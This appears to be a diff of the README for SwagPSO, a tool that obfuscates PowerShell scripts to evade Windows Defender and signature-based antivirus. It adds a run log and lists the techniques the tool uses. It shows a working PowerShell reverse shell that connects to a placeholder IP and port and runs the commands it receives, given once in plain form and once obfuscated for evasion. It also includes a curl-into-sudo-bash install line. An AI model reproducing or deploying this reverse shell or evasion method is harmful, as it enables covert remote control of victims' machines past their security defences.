@@ -13,15 +13,62 @@ sudo bash -c "curl https://raw.githubusercontent.com/1337Rin/Swag-PSO/main/swagp
 ```
 
 ## Description
-SwagPSO is a simple shell script to help obfuscate powershell scripts in order to bypass Windows Defender and other signature based AV. SwagPSO only focuses on automating obfuscation techniques that would be tedious to do by hand and therefore should not be the only tool used in the obfuscation process. Additionally it may break programs depending on their complexity and is thus better suited for simple scripts. It currently supports 5 tecniques.
+SwagPSO is a simple shell script to help obfuscate powershell scripts in order to bypass Windows Defender and other signature based AV. SwagPSO only focuses on automating obfuscation techniques that would be tedious to do by hand and therefore should not be the only tool used in the obfuscation process. Additionally it may break programs depending on their complexity and is thus better suited for simple scripts. It currently supports 7 tecniques.
 * renaming functions
 * renaming variables
+* renaming cmdlets
 * randomizing capatalization
 * adding junk comments
 * replacing "\n" with ;
+* removing unessesary spaces
 
 ## Example
-using SwagPSO...
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ./swagpso.sh -s rev.ps1 -v coolvariable -f nicefunction
+  ______  __       __  ______   ______       _______   ______   ______  
+ /      \|  \  _  |  \/      \ /      \     |       \ /      \ /      \
+|  ▓▓▓▓▓▓\ ▓▓ / \ | ▓▓  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\    | ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\
+| ▓▓___\▓▓ ▓▓/  ▓\| ▓▓ ▓▓__| ▓▓ ▓▓ __\▓▓    | ▓▓__/ ▓▓ ▓▓___\▓▓ ▓▓  | ▓▓
+ \▓▓    \| ▓▓  ▓▓▓\ ▓▓ ▓▓    ▓▓ ▓▓|    \    | ▓▓    ▓▓\▓▓    \| ▓▓  | ▓▓
+ _\▓▓▓▓▓▓\ ▓▓ ▓▓\▓▓\▓▓ ▓▓▓▓▓▓▓▓ ▓▓ \▓▓▓▓    | ▓▓▓▓▓▓▓ _\▓▓▓▓▓▓\ ▓▓  | ▓▓
+|  \__| ▓▓ ▓▓▓▓  \▓▓▓▓ ▓▓  | ▓▓ ▓▓__| ▓▓    | ▓▓     |  \__| ▓▓ ▓▓__/ ▓▓
+ \▓▓    ▓▓ ▓▓▓    \▓▓▓ ▓▓  | ▓▓\▓▓    ▓▓    | ▓▓      \▓▓    ▓▓\▓▓    ▓▓
+  \▓▓▓▓▓▓ \▓▓      \▓▓\▓▓   \▓▓ \▓▓▓▓▓▓      \▓▓       \▓▓▓▓▓▓  \▓▓▓▓▓▓ 
+                                                                        
+By: 1337Rin
+github: https://github.com/1337Rin/Swag-PSO
+
+[-] original_rev.ps1 already exists
+
+[+] creating copy
+[+] rev.ps1 --> original_rev.ps11
+
+[-] no functions found
+
+[+] renaming variables
+[+] $buffer --> $coolvariablexGRYSRy29xK0WBo5Q7zx
+[+] $encoding --> $coolvariableg2wCBRTzRsXDMgzLqW69
+[+] $null --> $coolvariableaEBK1zFFe5A1lCezd6he
+[+] $out --> $coolvariableVzLv47EBrwFfIA75Zzep
+[+] $read --> $coolvariableJQobgKI01nxko3qIv0q3
+[+] $res --> $coolvariablefJv19MiNqgf6z6Kp2rW5
+[+] $socket --> $coolvariableWeLGwQewmAISzZu8oClW
+[+] $stream --> $coolvariableH1QUvksSTFmrHWnl5kDj
+[+] $writer --> $coolvariablelUPojbcD1onBPdkrHvmE
+
+[+] creating junk commets
+[+] ; --> ;<#tjyqhyohhh#>
+
+[+] searching for commands
+[+] found New-Object
+[+] making alias New-Object --> vwfqdqybfvmswwy
+
+[+] restructuring script
+
+[+] getting rid of spaces around equal sign
+```
+rev.ps1
 ```powershell
 $socket = new-object System.Net.Sockets.TcpClient("<IP>",<PORT>);
 if($socket -eq $null){exit 1}
@@ -45,5 +92,8 @@ $writer.close();$socket.close();
 ```
 would become...
 ```powershell
-$babys_first_programmWN1BRx7SjcmX7jRPncH = neW-oBJeCt systeM.net.soCKets.tCpClient("<ip>",<port>);<#fhzbi#>;if($babys_first_programmWN1BRx7SjcmX7jRPncH -eq $babys_first_programYbkv5RJpgIyTNDnEYU5k){eXit 1};$babys_first_programZe3M3kaGXgLr86LFV4aQ = $babys_first_programmWN1BRx7SjcmX7jRPncH.GetstreaM();<#fhzbi#>;$babys_first_programrEtlVoFT8BpA8C9Oyijq = neW-oBJeCt systeM.io.streaMWriter($babys_first_programZe3M3kaGXgLr86LFV4aQ);<#fhzbi#>;$babys_first_program9tYZO5jojGkbSgB36qw7 = neW-oBJeCt systeM.Byte[] 1024;<#fhzbi#>;$babys_first_program60fXu3maa4rL2uATEbrR = neW-oBJeCt systeM.teXt.asCiienCodinG;<#fhzbi#>;do{; $babys_first_programrEtlVoFT8BpA8C9Oyijq.Write("[neW]> ");<#fhzbi#>; $babys_first_programrEtlVoFT8BpA8C9Oyijq.flUsh();<#fhzbi#>; $babys_first_programPf3xEva5bv3rjpPPcY0Q = $babys_first_programYbkv5RJpgIyTNDnEYU5k;<#fhzbi#>; While($babys_first_programZe3M3kaGXgLr86LFV4aQ.dataaVailaBle -or ($babys_first_programPf3xEva5bv3rjpPPcY0Q = $babys_first_programZe3M3kaGXgLr86LFV4aQ.read($babys_first_program9tYZO5jojGkbSgB36qw7, 0, 1024)) -eq $babys_first_programYbkv5RJpgIyTNDnEYU5k){}; $babys_first_programLesW7SueU7yb0fUEvgau = $babys_first_program60fXu3maa4rL2uATEbrR.GetstrinG($babys_first_program9tYZO5jojGkbSgB36qw7, 0, $babys_first_programPf3xEva5bv3rjpPPcY0Q).replaCe("rn","").replaCe("`n","");<#fhzbi#>; if(!$babys_first_programLesW7SueU7yb0fUEvgau.eqUals("eXit")){; $babys_first_programLesW7SueU7yb0fUEvgau = $babys_first_programLesW7SueU7yb0fUEvgau.split(); $babys_first_programekuoBqPcZzisObyVeYUD = [strinG](&$babys_first_programLesW7SueU7yb0fUEvgau[0] $babys_first_programLesW7SueU7yb0fUEvgau[1..$babys_first_programLesW7SueU7yb0fUEvgau.lenGth]);<#fhzbi#>; if($babys_first_programekuoBqPcZzisObyVeYUD -ne $babys_first_programYbkv5RJpgIyTNDnEYU5k){ $babys_first_programrEtlVoFT8BpA8C9Oyijq.Writeline($babys_first_programekuoBqPcZzisObyVeYUD)}; };}While (!$babys_first_programLesW7SueU7yb0fUEvgau.eqUals("eXit"));$babys_first_programrEtlVoFT8BpA8C9Oyijq.Close();<#fhzbi#>$babys_first_programmWN1BRx7SjcmX7jRPncH.Close();<#fhzbi#>;
+Set-Alias -Name vwfqdqybfvmswwy -Value New-Object;;$coolvariableWeLGwQewmAISzZu8oClW=vwfqdqybfvmswwy System.Net.Sockets.TcpClient("<IP>",<PORT>);<#tjyqhyohhh#>;if($coolvariableWeLGwQewmAISzZu8oClW -eq $coolvariableaEBK1zFFe5A1lCezd6he){exit 1};$coolvariableH1QUvksSTFmrHWnl5kDj=$coolvariableWeLGwQewmAISzZu8oClW.GetStream();<#tjyqhyohhh#>;$coolvariablelUPojbcD1onBPdkrHvmE=vwfqdqybfvmswwy System.IO.StreamWriter($coolvariableH1QUvksSTFmrHWnl5kDj);<#tjyqhyohhh#>;$coolvariablexGRYSRy29xK0WBo5Q7zx=vwfqdqybfvmswwy System.Byte[] 1024;<#tjyqhyohhh#>;$coolvariableg2wCBRTzRsXDMgzLqW69=vwfqdqybfvmswwy System.Text.AsciiEncoding;<#tjyqhyohhh#>;do{; $coolvariablelUPojbcD1onBPdkrHvmE.Write("[new]> ");<#tjyqhyohhh#>; $coolvariablelUPojbcD1onBPdkrHvmE.Flush();<#tjyqhyohhh#>; $coolvariableJQobgKI01nxko3qIv0q3=$coolvariableaEBK1zFFe5A1lCezd6he;<#tjyqhyohhh#>; while($coolvariableH1QUvksSTFmrHWnl5kDj.DataAvailable -or ($coolvariableJQobgKI01nxko3qIv0q3=$coolvariableH1QUvksSTFmrHWnl5kDj.Read($coolvariablexGRYSRy29xK0WBo5Q7zx, 0, 1024)) -eq $coolvariableaEBK1zFFe5A1lCezd6he){}; $coolvariableVzLv47EBrwFfIA75Zzep=$coolvariableg2wCBRTzRsXDMgzLqW69.GetString($coolvariablexGRYSRy29xK0WBo5Q7zx, 0, $coolvariableJQobgKI01nxko3qIv0q3).Replace("rn","").Replace("`n","");<#tjyqhyohhh#>; if(!$coolvariableVzLv47EBrwFfIA75Zzep.equals("exit")){; $coolvariableVzLv47EBrwFfIA75Zzep=$coolvariableVzLv47EBrwFfIA75Zzep.split(); $coolvariablefJv19MiNqgf6z6Kp2rW5=[string](&$coolvariableVzLv47EBrwFfIA75Zzep[0] $coolvariableVzLv47EBrwFfIA75Zzep[1..$coolvariableVzLv47EBrwFfIA75Zzep.length]);<#tjyqhyohhh#>; if($coolvariablefJv19MiNqgf6z6Kp2rW5 -ne $coolvariableaEBK1zFFe5A1lCezd6he){ $coolvariablelUPojbcD1onBPdkrHvmE.WriteLine($coolvariablefJv19MiNqgf6z6Kp2rW5)}; };}While (!$coolvariableVzLv47EBrwFfIA75Zzep.equals("exit"));$coolvariablelUPojbcD1onBPdkrHvmE.close();<#tjyqhyohhh#>$coolvariableWeLGwQewmAISzZu8oClW.close();<#tjyqhyohhh#>;
 ```
+
+## Credits
+- [Tristram](https://github.com/gh0x0st) Big thanks for helping to implement cmdlet parsing.
